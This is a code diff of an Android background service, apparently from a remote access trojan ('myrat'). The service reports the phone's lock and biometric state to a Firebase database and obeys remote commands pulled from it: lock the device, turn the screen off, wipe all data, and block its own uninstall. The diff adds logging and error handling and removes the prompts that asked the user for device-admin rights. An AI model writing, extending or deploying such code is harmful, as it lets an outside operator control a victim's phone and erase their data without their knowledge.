@@ -4,7 +4,6 @@ import android.app.*
 import android.app.admin.DevicePolicyManager
 import android.content.*
 import android.content.pm.PackageManager
-import android.hardware.biometrics.BiometricPrompt
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.*
@@ -32,28 +31,25 @@ class LockService : Service() {
     private lateinit var db: com.google.firebase.database.DatabaseReference
     private var biometricReceiver: BroadcastReceiver? = null
     private var deviceAdviceListener: ValueEventListener? = null
-    private var lastCommandTime = 0L // Debounce for RTDB commands
+    private var lastCommandTime = 0L
 
     companion object {
         private const val NOTIFICATION_ID = 3
         private const val CHANNEL_ID = "LockServiceChannel"
-        private const val COMMAND_DEBOUNCE_MS = 1000L // 1 second debounce
+        private const val COMMAND_DEBOUNCE_MS = 1000L
     }
 
     override fun onCreate() {
         super.onCreate()
         try {
-            // Start foreground service immediately
             startForeground(NOTIFICATION_ID, buildNotification())
 
-            // Check network availability
             if (!isNetworkAvailable()) {
                 Logger.error("No network available, stopping LockService")
                 stopSelf()
                 return
             }
 
-            // Initialize Firebase with retry
             try {
                 db = Firebase.database.getReference()
                 Logger.log("Firebase initialized successfully in LockService")
@@ -68,11 +64,10 @@ class LockService : Service() {
                         Logger.error("Firebase retry failed, stopping service", retryException)
                         stopSelf()
                     }
-                }, 5000) // Retry after 5 seconds
+                }, 5000)
                 return
             }
 
-            // Initialize deviceId with fallback
             deviceId = try {
                 MainActivity.getDeviceId(this) ?: run {
                     Logger.error("Device ID is null, using fallback ID")
@@ -85,7 +80,6 @@ class LockService : Service() {
 
             Logger.log("LockService started for deviceId: $deviceId")
 
-            // Initialize system services with null checks
             devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: run {
                 Logger.error("DevicePolicyManager unavailable")
                 stopSelf()
@@ -103,12 +97,15 @@ class LockService : Service() {
             }
             adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
             executor = ContextCompat.getMainExecutor(this)
+            
             setupBiometricResultReceiver()
+            
             db.child("Device").child(deviceId).child("lock_service").child("connected")
                 .setValue(true)
                 .addOnFailureListener { e ->
                     Logger.error("Failed to set connected status in LockService", e)
                 }
+            
             fetchAndUploadLockDetails()
             listenForDeviceAdviceCommands()
         } catch (e: Exception) {
@@ -134,8 +131,8 @@ class LockService : Service() {
             }
             return NotificationCompat.Builder(this, channelId)
                 .setContentTitle("Lock Service")
-                .setContentText("Running in background")
-                .setSmallIcon(android.R.color.transparent)
+                .setContentText("Monitoring device lock commands")
+                .setSmallIcon(R.drawable.ic_launcher_foreground)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build()
         } catch (e: Exception) {
@@ -143,7 +140,7 @@ class LockService : Service() {
             return NotificationCompat.Builder(this, channelId)
                 .setContentTitle("Lock Service")
                 .setContentText("Running in background")
-                .setSmallIcon(android.R.color.transparent)
+                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .build()
         }
@@ -163,26 +160,39 @@ class LockService : Service() {
     }
 
     private fun fetchAndUploadLockDetails() {
-        val lockDetails = mapOf(
-            "isDeviceSecure" to keyguardManager.isDeviceSecure,
-            "biometricStatus" to getBiometricStatus(),
-            "biometricType" to getBiometricType(),
-            "isDeviceAdminActive" to devicePolicyManager.isAdminActive(adminComponent)
-        )
-        db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
-            .addOnFailureListener { e ->
-                Logger.error("Failed to upload lock details: ${e.message}")
-            }
+        try {
+            val lockDetails = mapOf(
+                "isDeviceSecure" to keyguardManager.isDeviceSecure,
+                "biometricStatus" to getBiometricStatus(),
+                "biometricType" to getBiometricType(),
+                "isDeviceAdminActive" to devicePolicyManager.isAdminActive(adminComponent),
+                "lastUpdated" to System.currentTimeMillis()
+            )
+            db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
+                .addOnSuccessListener {
+                    Logger.log("Lock details uploaded successfully")
+                }
+                .addOnFailureListener { e ->
+                    Logger.error("Failed to upload lock details: ${e.message}")
+                }
+        } catch (e: Exception) {
+            Logger.error("Error fetching lock details", e)
+        }
     }
 
     private fun getBiometricStatus(): String {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val biometricManager = androidx.biometric.BiometricManager.from(this)
-            when (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
-                androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Enrolled"
-                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
-                androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
-                else -> "Unknown"
+            try {
+                val biometricManager = androidx.biometric.BiometricManager.from(this)
+                when (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
+                    androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Enrolled"
+                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
+                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
+                    else -> "Unknown"
+                }
+            } catch (e: Exception) {
+                Logger.error("Error getting biometric status", e)
+                "Error"
             }
         } else {
             "Not Available"
@@ -191,11 +201,16 @@ class LockService : Service() {
 
     private fun getBiometricType(): String {
         return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val biometricManager = androidx.biometric.BiometricManager.from(this)
-            if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
-                "Fingerprint/Face"
-            } else {
-                "None"
+            try {
+                val biometricManager = androidx.biometric.BiometricManager.from(this)
+                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
+                    "Fingerprint/Face"
+                } else {
+                    "None"
+                }
+            } catch (e: Exception) {
+                Logger.error("Error getting biometric type", e)
+                "Error"
             }
         } else {
             "None"
@@ -207,25 +222,30 @@ class LockService : Service() {
             deviceAdviceListener = object : ValueEventListener {
                 override fun onDataChange(snapshot: DataSnapshot) {
                     try {
-                        Logger.log("RTDB snapshot: ${snapshot.value}")
+                        Logger.log("RTDB snapshot received for device advice")
                         if (!snapshot.exists()) {
-                            Logger.log("No data in snapshot")
+                            Logger.log("No data in device advice snapshot")
                             return
                         }
+                        
                         val data = snapshot.getValue(DeviceAdviceCommand::class.java) ?: run {
                             Logger.error("Failed to deserialize DeviceAdviceCommand")
                             return
                         }
+                        
                         if (data.status != "pending") {
                             Logger.log("Ignoring non-pending command: ${data.action}")
                             return
                         }
+                        
                         if (System.currentTimeMillis() - lastCommandTime < COMMAND_DEBOUNCE_MS) {
                             Logger.log("Command ignored due to debounce: ${data.action}")
                             return
                         }
+                        
                         lastCommandTime = System.currentTimeMillis()
-                        Logger.log("Processing command: ${data.action}")
+                        Logger.log("Processing lock command: ${data.action}")
+                        
                         when (data.action) {
                             "lock" -> lockDevice(data)
                             "unlock" -> notifyUserToUnlock(data)
@@ -261,19 +281,10 @@ class LockService : Service() {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.lockNow()
                 updateCommandStatus(command, "success", null)
+                Logger.log("Device locked successfully")
             } else {
                 Logger.error("Device admin not active for lockDevice")
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to lock the device")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                try {
-                    startActivity(intent)
-                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
-                } catch (e: Exception) {
-                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
-                }
+                updateCommandStatus(command, "failed", "Device admin not active")
             }
         } catch (e: Exception) {
             Logger.error("Lock device failed", e)
@@ -310,6 +321,7 @@ class LockService : Service() {
                 wakeLock.acquire(1000)
                 wakeLock.release()
                 updateCommandStatus(command, "success", null)
+                Logger.log("Screen turned on successfully")
             } else {
                 updateCommandStatus(command, "success", "Screen already on")
             }
@@ -324,19 +336,10 @@ class LockService : Service() {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.lockNow()
                 updateCommandStatus(command, "success", null)
+                Logger.log("Screen turned off successfully")
             } else {
                 Logger.error("Device admin not active for screenOff")
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to turn off screen")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                try {
-                    startActivity(intent)
-                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
-                } catch (e: Exception) {
-                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
-                }
+                updateCommandStatus(command, "failed", "Device admin not active")
             }
         } catch (e: Exception) {
             Logger.error("Turn screen off failed", e)
@@ -389,19 +392,10 @@ class LockService : Service() {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.wipeData(0)
                 updateCommandStatus(command, "success", null)
+                Logger.log("Device wipe initiated")
             } else {
                 Logger.error("Device admin not active for wipeThePhone")
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to wipe the device")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                try {
-                    startActivity(intent)
-                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
-                } catch (e: Exception) {
-                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
-                }
+                updateCommandStatus(command, "failed", "Device admin not active")
             }
         } catch (e: Exception) {
             Logger.error("Wipe device failed", e)
@@ -414,19 +408,10 @@ class LockService : Service() {
             if (devicePolicyManager.isAdminActive(adminComponent)) {
                 devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                 updateCommandStatus(command, "success", null)
+                Logger.log("Uninstall prevention enabled")
             } else {
                 Logger.error("Device admin not active for preventUninstall")
-                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Please enable device admin to prevent uninstall")
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                }
-                try {
-                    startActivity(intent)
-                    updateCommandStatus(command, "pending", "Waiting for device admin activation")
-                } catch (e: Exception) {
-                    updateCommandStatus(command, "failed", "Device admin not active and failed to prompt: ${e.message}")
-                }
+                updateCommandStatus(command, "failed", "Device admin not active")
             }
         } catch (e: Exception) {
             Logger.error("Prevent uninstall failed", e)
@@ -442,6 +427,9 @@ class LockService : Service() {
             )
             error?.let { updates["error"] = it }
             db.child("Device").child(deviceId).child("deviceAdvice").updateChildren(updates)
+                .addOnSuccessListener {
+                    Logger.log("Updated command status: ${command.action} -> $status")
+                }
                 .addOnFailureListener { e ->
                     Logger.error("Failed to update command status: ${e.message}")
                 }
@@ -451,31 +439,32 @@ class LockService : Service() {
     }
 
     private fun setupBiometricResultReceiver() {
-        biometricReceiver = object : BroadcastReceiver() {
-            override fun onReceive(context: Context?, intent: Intent?) {
-                try {
-                    val commandId = intent?.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID) ?: run {
-                        Logger.error("Biometric result missing commandId")
-                        return
+        try {
+            biometricReceiver = object : BroadcastReceiver() {
+                override fun onReceive(context: Context?, intent: Intent?) {
+                    try {
+                        val commandId = intent?.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID) ?: run {
+                            Logger.error("Biometric result missing commandId")
+                            return
+                        }
+                        val result = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_RESULT) ?: run {
+                            Logger.error("Biometric result missing result")
+                            return
+                        }
+                        val action = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION) ?: run {
+                            Logger.error("Biometric result missing action")
+                            return
+                        }
+                        val error = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ERROR)
+                        Logger.log("Received biometric result: commandId=$commandId, result=$result, action=$action")
+                        val command = DeviceAdviceCommand(action = action, commandId = commandId, status = result, error = error)
+                        updateCommandStatus(command, result, error)
+                    } catch (e: Exception) {
+                        Logger.error("Failed to process biometric result", e)
                     }
-                    val result = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_RESULT) ?: run {
-                        Logger.error("Biometric result missing result")
-                        return
-                    }
-                    val action = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION) ?: run {
-                        Logger.error("Biometric result missing action")
-                        return
-                    }
-                    val error = intent.getStringExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ERROR)
-                    Logger.log("Received biometric result: commandId=$commandId, result=$result, action=$action")
-                    val command = DeviceAdviceCommand(action = action, commandId = commandId, status = result, error = error)
-                    updateCommandStatus(command, result, error)
-                } catch (e: Exception) {
-                    Logger.error("Failed to process biometric result", e)
                 }
             }
-        }
-        try {
+            
             registerReceiver(biometricReceiver, IntentFilter(com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_RESULT))
             Logger.log("Biometric result receiver registered")
         } catch (e: Exception) {
